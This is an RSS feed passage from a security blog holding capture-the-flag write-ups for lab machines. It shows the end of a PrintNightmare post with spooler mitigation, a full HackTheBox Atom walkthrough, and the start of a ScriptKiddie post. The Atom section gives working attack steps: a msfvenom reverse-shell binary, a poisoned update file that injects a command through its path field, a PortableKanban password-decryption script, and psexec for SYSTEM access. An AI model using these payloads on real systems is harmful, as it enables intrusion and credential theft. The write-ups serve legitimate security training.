            <span class="n">CreateThread</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">Entry</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_ATTACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_THREAD_DETACH</span><span class="p">:</span>
        <span class="k">case</span> <span class="nl">DLL_PROCESS_DEATCH</span><span class="p">:</span>
            <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>For compilation, I will need <code>mingw-w64</code> compiler, which can be installed using <code>sudo apt install mingw-w64</code>. Once the compiler is installed, I will run the following command to compile the DLL.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ x86_64-w64-mingw32-gcc add_user_1.c -shared -o add_user.dll
</code></pre></div><p>I don&rsquo;t demo this DLL since the process and the result are the same 😅.</p>
<h2 id="mitigation">Mitigation</h2>
<p>Microsoft provided <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">two options</a> as workarounds to mitigate PrintNightmare: Disable Print Spooler service and Disable inbound remote printing through Group Policy. Also it is recommended to install <a href="https://support.microsoft.com/topic/31b91c02-05bc-4ada-a7ea-183b129578a7">KB5005010</a> patch.</p>
<p>As for the second option, I have no idea to work with that from CLI, so I&rsquo;ll just try the first option.</p>
<h3 id="disable-print-spooler-service">Disable Print Spooler Service</h3>
<p>First, determine if the Print Spooler Service is running by using  <code>Get-Service -Name Spooler</code> in PowerShell. If the service is running, stop and disable it by running the following commands in PowerShell consecutively.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ Stop-Service -Name Spooler -Force
$ Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>For demo, I will apply these on Bastion.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> Get-Service -Name Spooler 

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler


*Evil-WinRM* PS C:<span class="se">\&gt;</span> Stop-Service -Name Spooler -Force
*Evil-WinRM* PS C:<span class="se">\&gt;</span> Set-Service -Name Spooler -StartupType Disabled
</code></pre></div><p>After disabling Spooler service, I ran the exploit again, but this time, it returned a &ldquo;Connection Failed&rdquo; message.</p>
<p><img class="img-container" src="imgs/image-20210717133929589.png" alt="image-20210717133929589"  />
</p>
<p>So, the conclusion is it worked! But, the downside is you loss the ability to print from both local and remote 🙃.</p>
<p>For more detailed mitigation, you can go to <a href="https://github.com/LaresLLC/CVE-2021-1675">this GitHub repo</a>.</p>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a></li>
<li><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675</a></li>
<li><a href="https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/">https://unit42.paloaltonetworks.com/cve-2021-34527-printnightmare/</a></li>
<li><a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a></li>
<li><a href="https://github.com/calebstewart/CVE-2021-1675">https://github.com/calebstewart/CVE-2021-1675</a></li>
<li><a href="https://github.com/LaresLLC/CVE-2021-1675">https://github.com/LaresLLC/CVE-2021-1675</a></li>
<li><a href="https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point">https://unix.stackexchange.com/questions/583374/i-am-having-a-hard-time-installing-impacket-into-kali-linux-can-some-one-point</a></li>
<li><a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Atom</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</link>
      <pubDate>Sat, 10 Jul 2021 20:28:32 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-atom/</guid>
      <description>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server.</description>
      <content:encoded><![CDATA[<p>Atom brings a real-life exploitation of a vulnerability in the auto-update feature of Electron-Builder. In Atom, there is a writable SMB share which is used by a company to store an update definition file for QA testing. By leveraging the write access, a malicious update definition can be uploaded there. This malicious update definition points to my reverse shell binary, which results in gaining an interactive shell to the system. Internal enumeration of the system finds a password which can be used to authenticate to a Redis server. I&rsquo;m able to obtain administrator credentials by dumping the Redis database.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploitation of Electron-Builder app through auto-update.</li>
<li>Redis enumeration</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Msfvenom</li>
<li>Netcat</li>
<li>Impacket</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan with <code>nmap</code> discovers six open ports: HTTP on 80 and its secure version on 443, MSRPC on 135, SMB on 445, WinRM on 5985 and Redis on 6379.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-atom 10.10.10.237
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 07:56 EDT
Nmap scan report <span class="k">for</span> 10.10.10.237
Host is up, received echo-reply ttl <span class="m">127</span> <span class="o">(</span>0.051s latency<span class="o">)</span>.
Not shown: <span class="m">65529</span> filtered ports
Reason: <span class="m">65529</span> no-responses
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
135/tcp  open  msrpc        syn-ack ttl <span class="m">127</span> Microsoft Windows RPC
443/tcp  open  ssl/http     syn-ack ttl <span class="m">127</span> Apache httpd 2.4.46 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1j PHP/7.3.27<span class="o">)</span>
445/tcp  open  microsoft-ds syn-ack ttl <span class="m">127</span> Microsoft Windows <span class="m">7</span> - <span class="m">10</span> microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
5985/tcp open  http         syn-ack ttl <span class="m">127</span> Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
6379/tcp open  redis        syn-ack ttl <span class="m">127</span> Redis key-value store
Service Info: Host: ATOM<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 153.92 seconds
</code></pre></div><p>A script scan doesn&rsquo;t really helpful, so I&rsquo;ll skip that here.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-6379---redis">TCP 6379 - Redis</h3>
<p>On Redis, authenticated is required.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «smb» «10.10.14.49» 
$ nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>?<span class="o">)</span> open
INFO
-NOAUTH Authentication required.
</code></pre></div><h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>SMB enumeration with Anonymous logon using <code>crackmapexec</code> reveals the Windows version and one writable share.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ crackmapexec smb 10.10.10.237 -u <span class="s1">&#39;ANONYMOUS&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Pro <span class="m">19042</span> x64 <span class="o">(</span>name:ATOM<span class="o">)</span> <span class="o">(</span>domain:ATOM<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> ATOM<span class="se">\A</span>NONYMOUS: 
SMB         10.10.10.237    <span class="m">445</span>    ATOM             <span class="o">[</span>+<span class="o">]</span> Enumerated shares
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Share           Permissions     Remark
SMB         10.10.10.237    <span class="m">445</span>    ATOM             -----           -----------     ------
SMB         10.10.10.237    <span class="m">445</span>    ATOM             ADMIN$                          Remote Admin
SMB         10.10.10.237    <span class="m">445</span>    ATOM             C$                              Default share
SMB         10.10.10.237    <span class="m">445</span>    ATOM             IPC$                            Remote IPC
SMB         10.10.10.237    <span class="m">445</span>    ATOM             Software_Updates READ,WRITE      
</code></pre></div><h4 id="software_updates-share">Software_Updates Share</h4>
<p>In <code>Software_Updates</code>, there is a PDF file called <code>UAT_Testing_Procedures.pdf</code>. I&rsquo;ll grab that file.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates
Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> dir
  .                                   D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  ..                                  D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client1                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client2                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  client3                             D        <span class="m">0</span>  Mon May <span class="m">17</span> 08:05:58 <span class="m">2021</span>
  UAT_Testing_Procedures.pdf          A    <span class="m">35202</span>  Fri Apr  <span class="m">9</span> 07:18:08 <span class="m">2021</span>

                <span class="m">4413951</span> blocks of size 4096. <span class="m">1361569</span> blocks available
smb: <span class="se">\&gt;</span> recurse on
smb: <span class="se">\&gt;</span> prompt off
smb: <span class="se">\&gt;</span> mget *
getting file <span class="se">\U</span>AT_Testing_Procedures.pdf of size <span class="m">35202</span> as UAT_Testing_Procedures.pdf <span class="o">(</span>121.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 121.5 KiloBytes/sec<span class="o">)</span>
</code></pre></div><h3 id="tcp-80443---website">TCP 80,443 - Website</h3>
<p>Both port 80 and 443 are displaying a software company site called &ldquo;Heed Solutions&rdquo;.</p>
<p><img class="img-container" src="imgs/image-20210517190515610.png" alt="image-20210517190515610"  />
</p>
<p>At the bottom, there is a hostname and a download link that points to <code>http://10.10.10.237/releases/heed_setup_v1.0.0.zip</code>.</p>
<p><img class="img-container" src="imgs/image-20210517190532910.png" alt="image-20210517190532910"  />
</p>
<p>I&rsquo;ll add the hostname to my <code>/etc/hosts</code> file and then download the previous software.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 atom.htb&#39;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>After the hostname added, the site still shows the same content.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://10.10.10.237/ <span class="p">|</span> wc -c
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://10.10.10.237/ <span class="p">|</span> wc -c 
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k http://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
→ root@kali «atom» «10.10.14.49» 
$ curl -s -k https://atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><h3 id="analysis">Analysis</h3>
<p>The previous zip file contains one executable file called <code>heedv1 Setup 1.0.0.exe</code>.</p>
<pre><code>→ root@kali «loot» «10.10.14.49» 
$ file heedv1_setup_1.0.0.exe 
heedv1_setup_1.0.0.exe: PE32 executable (GUI) Intel 80386, for MS Windows, Nullsoft Installer self-extracting archive
</code></pre><p>It says &ldquo;self-extracting archive&rdquo;, meaning it can be extracted, for example using <code>7z</code>.</p>
<p>While looking into the app structure, I spotted a file called <code>app-update.yml</code>.</p>
<pre><code>→ root@kali «heed_extracted» «10.10.14.49» 
$ tree
.
├── $PLUGINSDIR
│   ├── app-64
...&lt;SNIP&gt;...
│   │   ├── natives_blob.bin
│   │   ├── resources
│   │   │   ├── app.asar
│   │   │   ├── app-update.yml # ==&gt; Updater config
│   │   │   ├── electron.asar
│   │   │   ├── elevate.exe
│   │   │   └── inspector
...&lt;SNIP&gt;...

73 directories, 274 files
</code></pre><p>The file contains another hostname, which I&rsquo;ll add it to <code>/etc/hosts</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ cat ./<span class="se">\$</span>PLUGINSDIR/app-64/resources/app-update.yml
provider: generic
url: <span class="s1">&#39;http://updates.atom.htb&#39;</span>
publisherName:
  - HackTheBox
</code></pre></div><p>And again, it is the same site.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «heed_extracted» «10.10.14.49» 
$ curl -s http://updates.atom.htb/ <span class="p">|</span> wc -c
<span class="m">7581</span>
</code></pre></div><p>Guessing based on the content of <code>UAT_Testing_Procedures.pdf</code> file from SMB enumeration, <code>heedv1_setup_1.0.0.exe </code> is currently on testing phase. Other information that I can obtain are:</p>
<ul>
<li>The app is packed with electron-builder</li>
<li>The app has auto-update feature, but before releasing the updated app, the QA team will test it first.</li>
</ul>
<p><img class="img-container" src="imgs/image-20210517200229002.png" alt="image-20210517200229002"  />
</p>
<p>According to the image above, the <code>client</code> folder here probably refers to the ones on SMB.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jason">Shell as Jason</h3>
<h4 id="rce-electron-updater---background">RCE Electron-Updater - Background</h4>
<p>I went to the rabbit hole by analyzing the executable file. At first, I thought I could inject the <code>app-update.yml</code> to point to my malicious <code>.exe</code> file and repack the app. I got the idea of poisoning the update file but didn&rsquo;t know where to start until I found this <a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">blog</a>.</p>
<p>According to that blog, during a software update, previous Electron-Updater uses the following line to perform a signature verification check of the new version of binary file.</p>
<pre><code>execFile(&quot;powershell.exe&quot;, [&quot;-NoProfile&quot;, &quot;-NonInteractive&quot;, &quot;-InputFormat&quot;, &quot;None&quot;, &quot;-Command&quot;, `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
...&lt;SNIP&gt;...
</code></pre><p>If <code>${tempUpdateFile}</code> is a user-controlled input, this can be leveraged for command injection: <code>';calc;'</code></p>
<blockquote>
<p><em>Since the <code>${tempUpdateFile}</code> variable is provided unescaped to the <code>execFile</code> utility, an attacker could bypass the entire signature verification by triggering a parse error in the script.</em></p>
</blockquote>
<p>The following is an example of malicious update definition that will pop a calculator.</p>
<pre><code>version: 2.0.0
path: u';calc;'pdate.exe
sha512: qwP35Rn5PLaBoZ8tzvRFK...&lt;SNIP&gt;...LM3WCmvJUXMYmZGW6T+fI=
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>Sending this <code>u';payload;'pdate.exe</code> as path would be troublesome, which is simplified as follows:</p>
<pre><code>`Get-AuthenticodeSignature 'u';payload;'pdate.exe' | ConvertTo-Json -Compress`
</code></pre><p>Now that if a single quote <code>'</code> is added to <code>path</code>, which becomes:</p>
<pre><code>`Get-AuthenticodeSignature 'u'pdate.exe' | ConvertTo-Json -Compress`
</code></pre><p>But then, it would breaks the signature verification.</p>
<p>And here&rsquo;s come the interesting part, an attacker could easily bypass this signature verification by recalculating the hash of <code>u'pdate.exe</code>. That&rsquo;s very clever, right?</p>
<h4 id="rce-electron-updater---exploitation">RCE Electron-Updater - Exploitation</h4>
<p>According to the SMB enumeration, all the <code>client</code> folders are writable, which means exploitation can be done in two ways: local and remote. But, I&rsquo;ll go with remote 😅.</p>
<p>First, I&rsquo;ll have to generate a reverse shell binary. This can be done with <code>msfvenom</code>. I&rsquo;ll host this binary using Python web server afterwards.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.49 <span class="nv">LPORT</span><span class="o">=</span><span class="m">53</span> -f exe -o i<span class="se">\&#39;</span>amf.exe
<span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: <span class="m">460</span> bytes
Final size of exe file: <span class="m">7168</span> bytes
Saved as: i<span class="err">&#39;</span>amf.exe
</code></pre></div><p>Next, I&rsquo;ll need to calculate the hash of <code>i'amf.exe</code> using the following command:</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
$ shasum -a <span class="m">512</span> i<span class="se">\&#39;</span>amf.exe <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f1 <span class="p">|</span> xxd -r -p <span class="p">|</span> base64 <span class="p">|</span> tr -d <span class="s1">&#39;\n&#39;</span>
Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw<span class="o">==</span>
</code></pre></div><p>The last thing I need is the update file. I&rsquo;ll create one called <code>update-iamf.yml</code>  which contains the following update definitions:</p>
<pre><code>version: 2.0.1
path: http://10.10.14.83/i'amf.exe
sha512: Y4xekmQ80+ALOD0xXBgPdaOmgSsbK8jACQ6xmF4ndoEOvleyI4HRTDniVdExVNryCPWGgxOElKPhMyJCywuLtw==
releaseDate: '2021-01-24T13:44:59.064Z'
</code></pre><p>I&rsquo;ll upload the update file to <code>Software_Updates</code> share using <code>smbclient</code>  and start a netcat listener. After a few minutes, the reverse shell binary connected to my listener.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">→ root@kali «exploits» «10.10.14.49» 
$ smbclient -N //10.10.10.237/Software_Updates -c &#34;put iamf-update.yml client1/latest.yml&#34;  &amp;&amp; nc -nvlp 53
putting file iamf-update.yml as \client1\latest.yml (1.1 kb/s) (average 1.1 kb/s)
listening on [any] 53 ...
connect to [10.10.14.49] from (UNKNOWN) [10.10.10.237] 64352
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami
whoami
atom\jason

C:\WINDOWS\system32&gt;
</code></pre></div><p><img class="img-container" src="imgs/image-20210517220650699.png" alt="image-20210517220650699"  />
</p>
<p>User flag is done here.</p>
<pre><code>C:\Users\jason\Desktop&gt;type user.txt
type user.txt
b77e754354e186f...&lt;SNIP&gt;...
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-system">Shell as SYSTEM</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>WinPEAS discovers a set of credentials for user <code>jason</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
[+] Checking Credential manager
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


     Username:              ATOM\jason
     Password:               kidvscat_electron_@123
     Target:                ATOM\jason
     PersistenceType:       Enterprise
     LastWriteTime:         3/31/2021 2:53:49 AM
</code></pre></div><p>On Jason&rsquo;s download directory, there is a PortableKanban folder. PortableKanban itself is a password manager. I have familiarity with this application from HTB Sharp (I&rsquo;ve not been able to pwn it, though 😂).  Its config contains encrypted Redis database password (The clear password revealed in the next section).</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Users\jason\Downloads&gt;type PortableKanban\PortableKanban.cfg
type PortableKanban\PortableKanban.cfg
{&#34;RoamingSettings&#34;:{&#34;DataSource&#34;:&#34;RedisServer&#34;,&#34;DbServer&#34;:&#34;localhost&#34;,&#34;DbPort&#34;:6379,&#34;DbEncPassword&#34;:&#34;Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb&#34;
...&lt;SNIP&gt;...
</code></pre></div><h4 id="redis-revisited">Redis Revisited</h4>
<p>Looking into the Redis installation folder, I find a plain password in <code>redis.windows.conf</code> file.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows.conf | findstr requirepass
type redis.windows.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p><code>redis.windows-service.conf</code> also contains the same password.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">C:\Program Files\Redis&gt;type redis.windows-service.conf | findstr requirepass
type redis.windows-service.conf | findstr requirepass
requirepass kidvscat_yes_kidvscat
</code></pre></div><p>The password <code>kidvscat_yes_kidvscat</code> works on Redis.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «atom» «10.10.14.49» 
$ rlwrap nc -nv 10.10.10.237 <span class="m">6379</span>
<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.237<span class="o">]</span> <span class="m">6379</span> <span class="o">(</span>redis<span class="o">)</span> open
AUTH jason kidvscat_electron_@123
-ERR wrong number of arguments <span class="k">for</span> <span class="s1">&#39;auth&#39;</span> <span class="nb">command</span>
AUTH kidvscat_electron_@123
-ERR invalid password
AUTH kidvscat_yes_kidvscat
+OK
</code></pre></div><p>It&rsquo;s possible to dump the database that is currently in use.</p>
<p>To do that, I&rsquo;ll send <code>INFO</code> command and starting to look for a chunk called <code>Keyspace</code> .</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">INFO
$1938
# Server
redis_version:3.0.504
...&lt;SNIP&gt;...
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
</code></pre></div><p>There is one database active, which is <code>db0</code> and it contains 4 keys.</p>
<p>I&rsquo;ll send <code>KEYS *</code> command to get all the stored keys.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">SELECT 0
+OK
KEYS *
*4
$48
pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$11
pk:ids:User
$20
pk:ids:MetaDataClass
$57
pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff
</code></pre></div><p>The value of <code>pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0</code> contains a credentials of the Administrator account, but the password is encrypted.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0
$207
{&#34;Id&#34;:&#34;e8e29158d70d44b1a1ba4949d52790a0&#34;,&#34;Name&#34;:&#34;Administrator&#34;,&#34;Initials&#34;:&#34;&#34;,&#34;Email&#34;:&#34;&#34;,&#34;EncryptedPassword&#34;:&#34;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#34;,&#34;Role&#34;:&#34;Admin&#34;,&#34;Inactive&#34;:false,&#34;TimeStamp&#34;:637530169606440253}
</code></pre></div><h4 id="portablekanban-decrypt">PortableKanban Decrypt</h4>
<p>By assuming that the password is encrypted using PortableKanban, I could try to decrypt the password I obtained using the following <a href="https://github.com/fahmifj/PortableKanban-decrypt/blob/main/pk-decrypt.py">script</a>  (a modified version of the original exploit).</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">from base64 import b64decode
import sys
import des 

<span class="nv">key</span> <span class="o">=</span> des.DesKey<span class="o">(</span>b<span class="s1">&#39;7ly6UznJ&#39;</span><span class="o">)</span>
<span class="nv">iv</span> <span class="o">=</span> b<span class="s1">&#39;XuVUm5fR&#39;</span>

try:    
	<span class="nv">passwd</span> <span class="o">=</span> b64decode<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>.encode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
except IndexError:
	print<span class="o">(</span><span class="s1">&#39;[-] Usage: %s &lt;base64_encrypted_passwd&gt;&#39;</span> % sys.argv<span class="o">[</span>0<span class="o">])</span>
    
	sys.exit<span class="o">(</span>-1<span class="o">)</span>

<span class="nv">dec_password</span> <span class="o">=</span> key.decrypt<span class="o">(</span>passwd, <span class="nv">initial</span><span class="o">=</span>iv, <span class="nv">padding</span><span class="o">=</span>True<span class="o">)</span>
print<span class="o">(</span><span class="s2">&#34;[+] Decrypted Password: &#34;</span> + dec_password.decode<span class="o">(</span><span class="s1">&#39;UTF-8&#39;</span><span class="o">))</span>
</code></pre></div><p>The administrator password has been decrypted to <code>kidvscat_admin_@123</code>.</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «atom» «10.10.14.83»
$ python3 pk-decrypt.py Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi
<span class="o">[</span>+<span class="o">]</span> Decrypted Password: kidvscat_admin_@123
</code></pre></div><h4 id="psexecpy">psexec.py</h4>
<p>I could use the credentials in psexec from impacket to obtain interactive shell access as system.</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">→ root@kali «atom» «10.10.14.49» 
$ impacket-psexec atom/administrator:&#39;kidvscat_admin_@123&#39;@10.10.10.237
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.237.....
[*] Found writable share ADMIN$
[*] Uploading file FCSITnEj.exe
[*] Opening SVCManager on 10.10.10.237.....
[*] Creating service DCLl on 10.10.10.237.....
[*] Starting service DCLl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.906]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami &amp;&amp; hostname
nt authority\system
ATOM

C:\WINDOWS\system32&gt;ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::525:3f10:5c90:26bf
   Temporary IPv6 Address. . . . . . : dead:beef::cc8a:70e1:ba06:84ed
   Link-local IPv6 Address . . . . . : fe80::525:3f10:5c90:26bf%6
   IPv4 Address. . . . . . . . . . . : 10.10.10.237
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%6
                                       10.10.10.2
</code></pre></div><hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html">https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis">https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</a></li>
<li><a href="https://www.exploit-db.com/exploits/49409">https://www.exploit-db.com/exploits/49409</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - ScriptKiddie</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</link>
      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</guid>
      <description>Exploiting exploitation tools</description>
      <content:encoded><![CDATA[<p>ScriptKiddie is all about exploiting exploitation tools. It starts by exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. For the last part, a sudo privileges on <code>msfconsole</code>  can be leveraged to gain a root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting Metasploit CVE-2020-7384</li>
<li>Log poisoning</li>
<li>Exploiting sudo privileges</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CVE-2020-7384 <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
